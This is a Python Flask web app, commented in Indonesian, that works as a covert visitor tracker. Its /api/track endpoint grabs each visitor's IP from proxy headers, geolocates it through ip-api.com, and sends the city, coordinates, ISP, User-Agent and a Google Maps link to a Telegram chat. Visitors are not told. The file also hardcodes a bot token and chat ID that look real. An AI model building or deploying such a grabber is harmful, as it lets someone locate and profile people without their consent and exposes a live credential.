from flask import Flask, render_template, request, jsonify
import requests
from datetime import datetime

app = Flask(__name__, 
            template_folder='../templates',
            static_folder='../static')

TELEGRAM_BOT_TOKEN = "8780073514:AAF4WU_A69EitrlCxx155yNxCwwHz41M__s"
TELEGRAM_CHAT_ID = "6446678808"

def get_client_ip():
    """Dapatkan IP client dengan prioritas header proxy"""
    # Urutan prioritas header
    headers_to_check = [
        'X-Forwarded-For',
        'X-Real-IP',
        'CF-Connecting-IP',      # Cloudflare
        'X-Vercel-Forwarded-For', # Vercel
        'True-Client-IP',
        'X-Client-IP',
    ]
    
    for header in headers_to_check:
        ip = request.headers.get(header)
        if ip:
            # X-Forwarded-For bisa berisi multiple IP: "client, proxy1, proxy2"
            ip = ip.split(',')[0].strip()
            # Filter IP private/loopback
            if ip and not ip.startswith(('127.', '10.', '192.168.', '172.', '::1')):
                return ip
    
    # Fallback ke remote_addr
    ip = request.remote_addr
    if ip and not ip.startswith(('127.', '::1')):
        return ip
    
    return None  # Return None bukan "127.0.0.1"

def get_ip_info(ip):
    """Ambil info IP dari ip-api.com"""
    try:
        if not ip:
            # Jika tidak ada IP (local dev), gunakan IP publik server
            url = 'http://ip-api.com/json/'
        else:
            url = f'http://ip-api.com/json/{ip}'
        
        fields = 'status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query'
        response = requests.get(
            f'{url}?fields={fields}', 
            timeout=5
        )
        data = response.json()
        
        print(f"[DEBUG] IP: {ip}, API Response: {data}")  # Debug log
        return data
        
    except Exception as e:
        print(f"[ERROR] get_ip_info: {e}")
        return {"status": "error", "message": str(e)}

def send_to_telegram(data):
    """Kirim data ke Telegram Bot"""
    # Validasi token
    if not TELEGRAM_BOT_TOKEN or len(TELEGRAM_BOT_TOKEN) < 20:
        print("⚠️ Bot Token belum di-set")
        return False
    
    # Handle nilai None/kosong
    def safe(key, default='N/A'):
        val = data.get(key)
        return val if val else default
    
    lat = safe('lat')
    lon = safe('lon')
    
    # Buat Google Maps link hanya jika koordinat valid
    if lat != 'N/A' and lon != 'N/A':
        maps_link = f"[Klik untuk lihat lokasi](https://www.google.com/maps?q={lat},{lon})"
    else:
        maps_link = "Koordinat tidak tersedia"
    
    message = f"""
🔴 *NEW VISITOR*

📅 *Waktu:* {safe('timestamp')}
🌐 *IP:* `{safe('query')}`
📍 *Lokasi:* {safe('city')}, {safe('regionName')}, {safe('country')}
🗺️ *Koordinat:* {lat}, {lon}
📡 *ISP:* {safe('isp')}
🏢 *Org:* {safe('org')}
🕐 *Timezone:* {safe('timezone')}
📱 *User Agent:* 
`{safe('user_agent')}`

🗺️ *Google Maps:* {maps_link}
"""
    
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message,
        'parse_mode': 'Markdown',
        'disable_web_page_preview': False
    }
    
    try:
        response = requests.post(url, json=payload, timeout=10)
        result = response.json()
        print(f"[DEBUG] Telegram response: {result}")  # Debug log
        return result.get('ok', False)
    except Exception as e:
        print(f"[ERROR] send_to_telegram: {e}")
        return False

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/track', methods=['GET', 'POST'])
def track():
    """Endpoint untuk tracking visitor"""
    client_ip = get_client_ip()
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    print(f"[DEBUG] Detected IP: {client_ip}")  # Debug log
    print(f"[DEBUG] All Headers: {dict(request.headers)}")  # Debug semua header
    
    # Ambil info IP
    ip_info = get_ip_info(client_ip)
    
    # Tambahkan data tambahan
    ip_info['user_agent'] = user_agent
    ip_info['timestamp'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    ip_info['detected_ip'] = client_ip  # IP yang terdeteksi app kita
    
    # Kirim ke Telegram
    telegram_sent = send_to_telegram(ip_info)
    ip_info['telegram_sent'] = telegram_sent
    
    return jsonify(ip_info)

@app.route('/api/ip-info', methods=['GET'])
def ip_info_route():
    client_ip = get_client_ip()
    data = get_ip_info(client_ip)
    data['user_agent'] = request.headers.get('User-Agent', 'Unknown')
    data['detected_ip'] = client_ip
    return jsonify(data)

@app.route('/favicon.ico')
def favicon():
    return '', 204

# Untuk Vercel
def handler(event, context):
    return app(event, context)

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
